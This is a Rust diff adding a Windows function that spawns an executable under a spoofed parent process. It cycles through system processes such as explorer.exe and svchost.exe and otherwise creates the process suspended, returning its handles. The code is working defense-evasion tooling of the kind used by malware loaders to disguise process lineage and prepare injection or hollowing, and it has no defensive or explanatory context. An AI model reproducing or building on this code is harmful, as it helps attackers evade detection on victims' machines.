@@ -60,6 +60,37 @@ pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(
 }
 
 #[cfg(target_os = "windows")]
+pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> {
+    let candidates: &[&[u8]] = &[
+        b"explorer.exe\0",
+        b"RuntimeBroker.exe\0",
+        b"sihost.exe\0",
+        b"svchost.exe\0",
+        b"SearchIndexer.exe\0",
+    ];
+    for &name in candidates {
+        if let Some(result) = spawn_with_ppid(target_exe, name) {
+            return Some(result);
+        }
+    }
+    use windows_sys::Win32::System::Threading::{
+        CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, CREATE_SUSPENDED,
+    };
+    use windows_sys::Win32::Foundation::CloseHandle;
+    let mut si: STARTUPINFOA = core::mem::zeroed();
+    si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
+    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
+    let ok = CreateProcessA(
+        core::ptr::null(), target_exe.as_ptr() as *mut u8,
+        core::ptr::null(), core::ptr::null(),
+        0, CREATE_SUSPENDED, core::ptr::null(), core::ptr::null(),
+        &si, &mut pi,
+    );
+    if ok == 0 { return None; }
+    Some((pi.hProcess, pi.hThread))
+}
+
+#[cfg(target_os = "windows")]
 unsafe fn find_pid_by_name(name: &[u8]) -> Option<u32> {
     use windows_sys::Win32::System::Diagnostics::ToolHelp::{
         CreateToolhelp32Snapshot, Process32First, Process32Next,
